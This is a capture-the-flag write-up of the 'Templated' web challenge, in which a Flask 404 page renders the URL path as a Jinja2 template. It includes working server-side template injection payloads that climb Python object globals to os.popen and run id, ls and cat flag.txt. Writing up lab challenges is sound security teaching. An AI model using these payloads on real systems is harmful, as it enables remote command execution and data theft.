---
layout: post
title: "Templated (HTB web)"
subtitle: "the url path is rendered as a jinja2 template, so the path is the injection"
date: 2023-02-02
tags: [htb, ctf, web, ssti, jinja2]
category: writeups
kind: challenge
tldr: "A Flask app reflected the requested URL path into a Jinja2 template. Visiting /${{1+1}} returned 2, which confirmed server-side template injection. I walked the object globals to import os and ran commands, then read the flag the same way."
---
{% raw %}

## the challenge

Templated was a tiny Flask app with almost no surface. The landing page was a single line saying the site was still under construction and was "Proudly powered by Flask/Jinja2", which named both the framework and the template engine for me up front. The response headers confirmed the stack:

```text
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Server: Werkzeug/1.0.1 Python/3.9.0
```

Werkzeug is the WSGI library Flask runs on, so this was a Flask app on Python 3.9 with the dev server. There were no forms, no query parameters, no API, no JavaScript doing anything. The only input I controlled was the URL path itself.

The one interesting behavior was the 404 handler. Any path I requested came back reflected in the error page, which echoed the requested name into the body. Requesting `/test` returned a page reading "The page 'test' could not be found." Requesting `/anything-else` swapped that word out for whatever I sent. That reflection is the whole challenge: the app folded the path segment into the response, and the only question was whether it went in as inert text or as part of a template string that Jinja2 then evaluated.

## the bug

Flask renders pages through Jinja2. The vulnerability appears when user input is concatenated into the template source before rendering, instead of being passed as a bound variable. Once user input is part of the template source, it is no longer data, it is template code, and Jinja2 evaluates it. That is server-side template injection. The give-away that this 404 page was vulnerable rather than safely escaped was that the engine was named in the footer and the path was being interpolated into the message rather than HTML-escaped into it.

I tested with an arithmetic probe in the path. Two equivalent probes confirm the same thing:

```text
http://TARGET/${{1+1}}
http://TARGET/{{7*7}}
```

The first came back reporting "The page '2' could not be found." The second returns "49" the same way. Plain text reflection would have echoed the literal `{{1+1}}` or `{{7*7}}` back; instead the braces were evaluated and the result rendered. That is only possible if my input reached the engine as code. The path was the injection point and I had a Jinja2 expression evaluating server-side. The `${...}` wrapper in the first probe is just there to dodge any literal `{{` filtering and read cleanly in a URL; the `{{ }}` print-statement is what Jinja2 actually evaluates.

## the solve

Going from "arithmetic evaluates" to "commands run" meant climbing the Python object model from inside the sandboxed template context. Jinja2 does not hand `os` or `subprocess` to a template directly, so I had to walk from an object the template already exposes, up into a module whose globals reach `__import__` or already hold `os`, then call out to the shell.

The chain I confirmed first started from `request`, the Flask request object available in the template globals:

```text
${{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

Reading it piece by piece:

- `request.application` is the WSGI application callable for the Flask app.
- `.__globals__` is the global namespace of the function object behind that callable, the dictionary holding every module-level name in that file.
- `.__builtins__` is the builtins mapping carried in that namespace, which contains `__import__`.
- `.__import__('os')` imports the `os` module.
- `.popen('id').read()` runs a shell command and reads its stdout back as a string, so the output renders into the page.

The 404 page came back with the page name being the output of `id`, the web user's uid, gid, and groups. That is command execution with output reflected straight back to me. From there it was only swapping the command string.

The publicly documented gadget for this box does not use `request` at all and reaches the same `os` from a pure string-literal root, which matters because `request` is not always in scope. The standard one walks the template render context through `cycler`, whose module globals already import `os`:

```text
${{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read()}}
```

`self._TemplateReference__context` is the render context, `cycler` is a built-in Jinja2 helper exposed in it, and `cycler.__init__.__globals__.os` is the `os` already imported in the module that defines `cycler`, so this skips the `__import__` step entirely. A third route walks the type MRO to find a subclass whose module imports `os` and reaches builtins from there:

```text
${{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("ls").read()}}
```

The `__subclasses__()` index is environment-dependent, so it is the brittle option. All four expressions land on the same primitive: a module whose globals give a path to running a process and reading its output. I had `request.application...` working, so I stayed with it; the `cycler` chain is the drop-in replacement if `request` is unavailable.

## the flag

I reused the `os.popen(...).read()` gadget to enumerate then read the flag. First a listing of the working directory to find the filename:

```text
${{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```

That surfaced `flag.txt` sitting in the application directory. Then the read:

```text
${{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}
```

Jinja2 rendered the file contents into the 404 page exactly where the path name normally goes. It came out as `HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!}`, a templates-are-powerful theme. The whole box was one reflection that interpolated the URL path into a template instead of escaping it, and the `cycler` chain reaches the same `os` if `request.application` is ever out of scope.
{% endraw %}
